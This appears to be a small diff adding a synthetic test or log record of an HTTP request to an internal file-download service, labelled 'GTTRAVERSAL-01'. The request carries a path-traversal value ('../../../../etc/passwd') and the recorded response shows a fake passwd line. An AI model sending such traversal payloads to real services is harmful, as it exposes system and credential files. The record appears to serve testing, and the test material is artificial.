@@ -1,0 +1,2 @@
+REQUEST GET http://svc-files:{'svc': 'svc-files', 'method': 'GET', 'path': '/download?path=../../../../etc/passwd', 'status': 200, 'loc': '', 'clen': '59', 'body': '<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>'}/download
+RESPONSE: <html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>
